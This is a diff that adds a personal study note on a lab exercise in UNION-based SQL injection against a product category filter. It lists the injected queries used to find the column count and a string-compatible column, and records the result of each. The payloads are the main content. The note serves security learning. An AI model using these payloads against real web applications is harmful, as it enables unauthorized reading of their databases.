@@ -1,0 +1,26 @@
+SQLI - Product Category Filter
+
+First step: determine the number of columns.
+
+Second step: Identify the a column that is compatiable with string type.
+
+It will provide me a random value `BBBFF9` that I wanna make it appear in the query result.
+
+Goal: SQL Injection Union-Based Attack that returns an additional row contains the `random value` provided above.
+
+Process:
+# GET THE NUMBER OF COLS
+SELECT ? FROM products WHERE category = 'Gifts';
+SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL--'; -> error
+SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL--'; -> error
+SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--'; -> (n of columns is 3)
+
+# GET THE COL THAT IS compatiable WITH STRING TYPE.
+SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT 'something',NULL,NULL--'; -> error
+SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,'BBBFF9',NULL--'; -> passed!
+SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,'something'--'; -> error
+
+
+THEY ARE 3 COLS IN THE TABLE products.
+THE SECOND COLUMN IS THE STRING compatiable TYPE BUT IT DOESN'T SUPPORT ""
+
